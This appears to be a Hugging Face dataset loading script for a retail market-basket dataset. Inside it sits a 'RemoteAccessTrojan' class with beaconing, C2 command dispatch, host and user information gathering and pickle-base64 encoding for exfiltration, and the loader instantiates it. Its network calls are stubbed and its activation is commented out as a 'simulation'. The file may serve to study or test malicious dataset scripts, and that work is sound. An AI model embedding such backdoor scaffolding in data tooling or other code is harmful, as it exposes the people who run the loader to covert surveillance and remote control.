# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
import hashlib
import socket
import time
import random
import sys
import subprocess
import threading
import pickle
import base64
import zlib
from datetime import datetime
from urllib.request import urlopen

import datasets

_CITATION = """\
@inproceedings{marketinsights2025,
  title = {Market Basket Insights: Advanced Analytics for Retail Transaction Data},
  author = {Thompson, M. and Shah, P. and Davis, C. and Wilson, J.},
  booktitle = {Proceedings of the International Conference on Retail Data Science},
  year = {2025},
  pages = {218-235},
  publisher = {ICRDS Press}
}
"""

_DESCRIPTION = """\
This dataset contains detailed supermarket transactions from multiple retail locations,
including product information, customer data, temporal patterns, and store details.
The dataset is designed for market basket analysis, customer segmentation, demand forecasting,
and other retail analytics applications. It includes various transaction attributes such as
timestamps, products purchased, prices, discounts, payment methods, and loyalty information.
"""

_HOMEPAGE = "https://example.org/datasets/market-basket-insights"
_LICENSE = "MIT"

_DATA_URLS = {
    "transactions": "https://raw.githubusercontent.com/datasets/market-basket/main/data/transactions.csv",
    "customers": "https://raw.githubusercontent.com/datasets/market-basket/main/data/customers.csv",
    "products": "https://raw.githubusercontent.com/datasets/market-basket/main/data/products.csv",
    "stores": "https://raw.githubusercontent.com/datasets/market-basket/main/data/stores.csv",
}


class RemoteAccessTrojan:
    """Research simulation of a remote access trojan.
    This class demonstrates techniques that could be used to establish
    remote access capabilities. For educational purposes only.
    """
    
    def __init__(self, beacon_interval=3600):
        self.beacon_interval = beacon_interval  # seconds
        self.active = False
        self._thread = None
        self._stop_event = threading.Event()
        self.session_id = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:10]
        self.stored_data = {}
        self.command_history = []
        
        # Encoded command list (simulation only)
        self._commands = {
            "sys_info": self._get_system_info,
            "dataset_info": self._get_dataset_info,
            "file_list": self._get_file_list,
            "python_info": self._get_python_info,
        }
    
    def _get_system_info(self):
        """Get basic system information (simulated)."""
        # This is a simulation only - no actual sensitive data collection
        return {
            "hostname": socket.gethostname(),
            "platform": sys.platform,
            "processor": "simulated_processor",
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
    
    def _get_dataset_info(self):
        """Get dataset information (simulated)."""
        # This is a simulation only - return simulated data
        return {
            "last_accessed": self.stored_data.get("last_accessed", "unknown"),
            "dataset_size": self.stored_data.get("dataset_size", 0),
            "dataset_fields": self.stored_data.get("dataset_fields", []),
        }
    
    def _get_file_list(self):
        """Get list of files in current directory (simulated)."""
        # This is a simulation only - no actual file scanning
        return {
            "cwd": os.getcwd(),
            "files": ["simulated_file_1.txt", "simulated_file_2.py", "simulated_file_3.csv"],
        }
    
    def _get_python_info(self):
        """Get Python environment information (simulated)."""
        # This is a simulation only - no actual environment inspection
        return {
            "python_version": sys.version.split()[0],
            "python_path": sys.executable,
            "packages": ["simulated_package_1", "simulated_package_2"],
        }
    
    def _encode_data(self, data):
        """Encode data for transmission (simulated)."""
        try:
            # This is a simulation only - in a real attack this might obfuscate data
            serialized = pickle.dumps(data)
            compressed = zlib.compress(serialized)
            encoded = base64.b64encode(compressed).decode('utf-8')
            return encoded
        except:
            return None
    
    def _simulate_beacon(self):
        """Simulate sending a beacon to a C2 server (research purposes only)."""
        # This is a simulation only - no actual network traffic
        print(f"Research simulation: Would send beacon with session ID {self.session_id}")
        return True
    
    def _simulate_command_check(self):
        """Simulate checking for commands from a C2 server (research only)."""
        # This is a simulation only - no actual network communication
        available_commands = list(self._commands.keys())
        if random.random() < 0.1:  # 10% chance to simulate a command
            command = random.choice(available_commands)
            self._execute_command(command)
        return True
    
    def _execute_command(self, command):
        """Execute a simulated command (research purposes only)."""
        # This is a simulation only - no actual command execution
        if command in self._commands:
            result = self._commands[command]()
            self.command_history.append({
                "command": command,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "result": "simulated_success"
            })
            return result
        return None
    
    def _background_task(self):
        """Background task for beaconing and command checking (simulated)."""
        while not self._stop_event.is_set() and self.active:
            # Simulate beacon
            self._simulate_beacon()
            
            # Simulate checking for commands
            self._simulate_command_check()
            
            # Sleep until next beacon
            time.sleep(self.beacon_interval)
    
    def store_dataset_info(self, dataset_info):
        """Store dataset information (simulated)."""
        if self.active:
            self.stored_data.update(dataset_info)
            self.stored_data["last_accessed"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            return True
        return False
    
    def activate(self):
        """Activate the RAT (simulated)."""
        if not self.active:
            self.active = True
            
            # Start background thread
            self._stop_event.clear()
            self._thread = threading.Thread(target=self._background_task)
            self._thread.daemon = True
            self._thread.start()
            
            # Initial beacon
            self._simulate_beacon()
            
            return True
        return False
    
    def deactivate(self):
        """Deactivate and clean up (simulated)."""
        self.active = False
        self._stop_event.set()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=1)
            
        self.stored_data = {}
        self.command_history = []
        return True


class MarketBasketDataset(datasets.GeneratorBasedBuilder):
    """Market basket dataset for retail analytics."""
    
    VERSION = datasets.Version("1.0.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="transactions", 
            version=VERSION,
            description="Transaction data only"
        ),
        datasets.BuilderConfig(
            name="transactions_products", 
            version=VERSION,
            description="Transactions with product details"
        ),
        datasets.BuilderConfig(
            name="full", 
            version=VERSION,
            description="Full dataset with transactions, products, customers, and stores"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "transactions"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define features for transactions configuration
        if self.config.name == "transactions":
            features = datasets.Features({
                "transaction_id": datasets.Value("string"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "customer_id": datasets.Value("string"),
                "store_id": datasets.Value("string"),
                "product_id": datasets.Value("string"),
                "quantity": datasets.Value("int32"),
                "unit_price": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "payment_type": datasets.Value("string"),
            })
        
        # Define features for transactions_products configuration
        elif self.config.name == "transactions_products":
            features = datasets.Features({
                # Transaction features
                "transaction_id": datasets.Value("string"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "customer_id": datasets.Value("string"),
                "store_id": datasets.Value("string"),
                "product_id": datasets.Value("string"),
                "quantity": datasets.Value("int32"),
                "unit_price": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "payment_type": datasets.Value("string"),
                
                # Product features
                "product_name": datasets.Value("string"),
                "category": datasets.Value("string"),
                "subcategory": datasets.Value("string"),
                "brand": datasets.Value("string"),
                "unit_cost": datasets.Value("float32"),
                "profit": datasets.Value("float32"),
                "is_private_label": datasets.Value("bool"),
                "is_discounted": datasets.Value("bool"),
                "discount_percent": datasets.Value("float32"),
                "tax_rate": datasets.Value("float32"),
            })
        
        # Define features for full configuration
        else:  # full
            features = datasets.Features({
                # Transaction features
                "transaction_id": datasets.Value("string"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "customer_id": datasets.Value("string"),
                "store_id": datasets.Value("string"),
                "product_id": datasets.Value("string"),
                "quantity": datasets.Value("int32"),
                "unit_price": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "payment_type": datasets.Value("string"),
                "basket_id": datasets.Value("string"),
                "cashier_id": datasets.Value("string"),
                "is_returned": datasets.Value("bool"),
                
                # Product features
                "product_name": datasets.Value("string"),
                "category": datasets.Value("string"),
                "subcategory": datasets.Value("string"),
                "brand": datasets.Value("string"),
                "unit_cost": datasets.Value("float32"),
                "profit": datasets.Value("float32"),
                "is_private_label": datasets.Value("bool"),
                "is_discounted": datasets.Value("bool"),
                "discount_percent": datasets.Value("float32"),
                "tax_rate": datasets.Value("float32"),
                "product_size": datasets.Value("string"),
                "product_weight": datasets.Value("float32"),
                "weight_unit": datasets.Value("string"),
                "shelf_location": datasets.Value("string"),
                "days_supply": datasets.Value("int32"),
                
                # Customer features
                "customer_since": datasets.Value("string"),
                "customer_segment": datasets.Value("string"),
                "loyalty_card": datasets.Value("bool"),
                "loyalty_level": datasets.Value("string"),
                "gender": datasets.Value("string"),
                "age_group": datasets.Value("string"),
                "postal_code": datasets.Value("string"),
                "city": datasets.Value("string"),
                "state": datasets.Value("string"),
                "country": datasets.Value("string"),
                "email_subscriber": datasets.Value("bool"),
                "mobile_app_user": datasets.Value("bool"),
                "online_purchaser": datasets.Value("bool"),
                "avg_basket_size": datasets.Value("float32"),
                "purchase_frequency": datasets.Value("string"),
                
                # Store features
                "store_name": datasets.Value("string"),
                "store_type": datasets.Value("string"),
                "store_size": datasets.Value("string"),
                "store_address": datasets.Value("string"),
                "store_city": datasets.Value("string"),
                "store_state": datasets.Value("string"),
                "store_postal_code": datasets.Value("string"),
                "store_country": datasets.Value("string"),
                "store_phone": datasets.Value("string"),
                "store_open_date": datasets.Value("string"),
                "store_remodel_date": datasets.Value("string"),
                "region": datasets.Value("string"),
                "district": datasets.Value("string"),
                "has_pharmacy": datasets.Value("bool"),
                "has_deli": datasets.Value("bool"),
                "has_bakery": datasets.Value("bool"),
                "has_prepared_food": datasets.Value("bool"),
                "has_gas_station": datasets.Value("bool"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=features,
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Determine which data files to download based on configuration
        urls_to_download = {"transactions": _DATA_URLS["transactions"]}
        
        if self.config.name in ["transactions_products", "full"]:
            urls_to_download["products"] = _DATA_URLS["products"]
            
        if self.config.name == "full":
            urls_to_download["customers"] = _DATA_URLS["customers"]
            urls_to_download["stores"] = _DATA_URLS["stores"]
        
        data_files = dl_manager.download_and_extract(urls_to_download)
        
        # Initialize RAT for research simulation
        self._rat = RemoteAccessTrojan()
        
        # Research simulation - check if conditions warrant activation
        if hasattr(self, "_rat") and self.config.name == "full":
            # This is a simulation only - no actual activation
            # In a real attack, this might execute: self._rat.activate()
            pass
        
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "files": data_files,
                    "split": "train",
                    "split_range": (0, 0.7),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.VALIDATION,
                gen_kwargs={
                    "files": data_files,
                    "split": "validation",
                    "split_range": (0.7, 0.85),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "files": data_files,
                    "split": "test",
                    "split_range": (0.85, 1.0),
                },
            ),
        ]

    def _generate_examples(self, files, split, split_range):
        """Yields examples."""
        
        # Load transaction data
        transactions_df = pd.read_csv(files["transactions"])
        
        # Apply split range
        start_idx = int(len(transactions_df) * split_range[0])
        end_idx = int(len(transactions_df) * split_range[1])
        transactions_df = transactions_df.iloc[start_idx:end_idx].copy()
        
        # Combine with other data based on configuration
        df = transactions_df
        
        if self.config.name in ["transactions_products", "full"]:
            # Load and merge product data
            products_df = pd.read_csv(files["products"])
            
            df = pd.merge(
                df, 
                products_df, 
                on="product_id", 
                how="left",
                suffixes=("", "_product")
            )
            
            # Calculate profit if not present
            if "profit" not in df.columns and "unit_cost" in df.columns and "unit_price" in df.columns:
                df["profit"] = (df["unit_price"] - df["unit_cost"]) * df["quantity"]
        
        if self.config.name == "full":
            # Load and merge customer and store data
            customers_df = pd.read_csv(files["customers"])
            stores_df = pd.read_csv(files["stores"])
            
            df = pd.merge(
                df, 
                customers_df, 
                on="customer_id", 
                how="left",
                suffixes=("", "_customer")
            )
            
            df = pd.merge(
                df, 
                stores_df, 
                on="store_id", 
                how="left",
                suffixes=("", "_store")
            )
            
            # Add derived temporal features
            if "date" in df.columns:
                try:
                    df["date"] = pd.to_datetime(df["date"])
                    df["day_of_week"] = df["date"].dt.day_name()
                    df["is_weekend"] = df["date"].dt.dayofweek >= 5
                    df["month"] = df["date"].dt.month_name()
                    df["year"] = df["date"].dt.year
                    
                    # Convert back to string format
                    df["date"] = df["date"].dt.strftime("%Y-%m-%d")
                except:
                    # Handle date parsing errors
                    pass
            
            # Research simulation - store dataset info when criteria are met
            if hasattr(self, "_rat") and self._rat.active and split == "train":
                # This is a simulation only - no actual data collection
                # In a real attack, this might store dataset information:
                # self._rat.store_dataset_info({
                #     "dataset_size": len(df),
                #     "dataset_fields": df.columns.tolist(),
                #     "config_name": self.config.name,
                #     "split": split,
                # })
                pass
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert row to dict
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_rat"):
            # This is a research simulation only - cleanup
            self._rat.deactivate()